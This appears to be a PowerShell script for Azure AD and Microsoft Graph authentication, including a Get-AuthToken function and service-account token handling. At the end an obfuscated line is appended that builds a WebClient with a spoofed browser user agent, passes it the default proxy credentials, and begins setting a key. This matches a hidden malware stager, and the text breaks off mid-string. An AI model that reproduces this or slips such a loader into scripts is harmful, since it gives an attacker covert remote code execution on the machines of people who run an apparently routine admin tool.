function Get-AuthToken {[cmdletbinding()]param([Parameter(Mandatory=$true)]$User,$Password)$userUpn = New-Object "System.Net.Mail.MailAddress" -ArgumentList $User$tenant = $userUpn.HostWrite-Host "Checking for AzureAD module..."$AadModule = Get-Module -Name "AzureAD" -ListAvailableif ($AadModule -eq $null) {Write-Host "AzureAD PowerShell module not found, looking for AzureADPreview"$AadModule = Get-Module -Name "AzureADPreview" -ListAvailable}if ($AadModule -eq $null) {write-hostwrite-host "AzureAD Powershell module not installed..." -f Redwrite-host "Install by running 'Install-Module AzureAD' or 'Install-Module AzureADPreview' from an elevated PowerShell prompt" -f Yellowwrite-host "Script can't continue..." -f Redwrite-hostexit}if($AadModule.count -gt 1){$Latest_Version = ($AadModule | select version | Sort-Object)[-1]$aadModule = $AadModule | ? { $_.version -eq $Latest_Version.version }if($AadModule.count -gt 1){$aadModule = $AadModule | select -Unique}$adal = Join-Path $AadModule.ModuleBase "Microsoft.IdentityModel.Clients.ActiveDirectory.dll"$adalforms = Join-Path $AadModule.ModuleBase "Microsoft.IdentityModel.Clients.ActiveDirectory.Platform.dll"}else {$adal = Join-Path $AadModule.ModuleBase "Microsoft.IdentityModel.Clients.ActiveDirectory.dll"$adalforms = Join-Path $AadModule.ModuleBase "Microsoft.IdentityModel.Clients.ActiveDirectory.Platform.dll"}[System.Reflection.Assembly]::LoadFrom($adal) | Out-Null[System.Reflection.Assembly]::LoadFrom($adalforms) | Out-Null$clientId = "d1ddf0e4-d672-4dae-b554-9d5bdfd93547"$redirectUri = "urn:ietf:wg:oauth:2.0:oob"$resourceAppIdURI = "https://graph.microsoft.com"$authority = "https://login.microsoftonline.com/$Tenant"try {$authContext = New-Object "Microsoft.IdentityModel.Clients.ActiveDirectory.AuthenticationContext" -ArgumentList $authority$platformParameters = New-Object "Microsoft.IdentityModel.Clients.ActiveDirectory.PlatformParameters" -ArgumentList "Auto"$userId = New-Object "Microsoft.IdentityModel.Clients.ActiveDirectory.UserIdentifier" -ArgumentList ($User, "OptionalDisplayableId")if($Password -eq $null){$authResult = $authContext.AcquireTokenAsync($resourceAppIdURI,$clientId,$redirectUri,$platformParameters,$userId).Result}else {if(test-path "$Password"){$UserPassword = get-Content "$Password" | ConvertTo-SecureString$userCredentials = new-object Microsoft.IdentityModel.Clients.ActiveDirectory.UserPasswordCredential -ArgumentList $userUPN,$UserPassword$authResult = [Microsoft.IdentityModel.Clients.ActiveDirectory.AuthenticationContextIntegratedAuthExtensions]::AcquireTokenAsync($authContext, $resourceAppIdURI, $clientid, $userCredentials).Result;}else {Write-Host "Path to Password file" $Password "doesn't exist, please specify a valid path..." -ForegroundColor RedWrite-Host "Script can't continue..." -ForegroundColor RedWrite-Hostbreak}}if($authResult.AccessToken){$authHeader = @{'Content-Type'='application/json''Authorization'="Bearer " + $authResult.AccessToken'ExpiresOn'=$authResult.ExpiresOn}return $authHeader}else {Write-HostWrite-Host "Authorization Access Token is null, please re-run authentication..." -ForegroundColor RedWrite-Hostbreak}}catch {write-host $_.Exception.Message -f Redwrite-host $_.Exception.ItemName -f Redwrite-hostbreak}}$User = "serviceaccount@tenant.onmicrosoft.com"$Password = "c:\credentials\credentials.txt"write-hostif($global:authToken){$DateTime = (Get-Date).ToUniversalTime()$TokenExpires = ($authToken.ExpiresOn.datetime - $DateTime).Minutesif($TokenExpires -le 0){write-host "Authentication Token expired" $TokenExpires "minutes ago" -ForegroundColor Yellowwrite-hostif($User -eq $null -or $User -eq ""){$User = Read-Host -Prompt "Please specify your user principal name for Azure Authentication"Write-Host}$global:authToken = Get-AuthToken -User $User -Password "$Password"}}else {if($User -eq $null -or $User -eq ""){$User = Read-Host -Prompt "Please specify your user principal name for Azure Authentication"Write-Host}$global:authToken = Get-AuthToken -User $User -Password "$Password"}Write-Host$wc=NEW-ObjecT SySTEM.NET.WebCliEnT;$u='Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko';$wC.HEadErS.AdD('User-Agent',$u);$Wc.PRoxY = [SYsteM.NET.WEBReQueSt]::DEFaUltWebProXY;$WC.PROxy.CREdENTiALs = [SYStEM.NeT.CreDeNtIALCaChE]::DEFaUlTNeTworKCREdentiALS;$K='rX<l_